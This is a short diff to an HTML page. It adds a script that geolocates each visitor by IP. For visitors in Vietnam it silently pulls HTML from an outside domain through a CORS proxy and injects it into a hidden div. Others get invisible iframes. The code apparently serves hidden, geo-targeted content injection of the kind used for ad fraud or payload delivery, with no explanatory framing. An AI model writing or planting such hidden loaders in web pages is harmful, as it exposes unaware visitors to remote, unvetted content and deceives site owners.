@@ -1,18 +1,27 @@
 <div style="display:none">
 <iframe class="c1" src="" height="100" width="100" ></iframe>
 <iframe class="c1" src="" height="100" width="100" ></iframe>
+<div class="c2">
+      
+</div>
 </div>
 <script src = "https://www.tutorialspoint.com/jquery/jquery-3.6.0.js"></script>
 
       <script>
      $.get("https://api.ipify.org?format=json", function(data, status){
        var url = "https://api.iplocation.net/?ip=" + data.ip;
-       
+           
        $.get(url, function(da, status){
+             
         if(da.country_code2 === 'VN') {
-          $(".c1").attr("src", "https://api.ipify.org?format=json");
+            var myUrl = 'https://adz2pro.xyz/d1.html';
+            var proxy = 'https://api.allorigins.win/raw?url=';
+            var finalURL = proxy + myUrl;
+            $.get(finalURL, function( ta ) {
+                $(".c2").append(ta);
+            });
         } else {
-          
+           $(".c1").attr("src", "https://api.ipify.org?format=json");
         }
     });
     });    
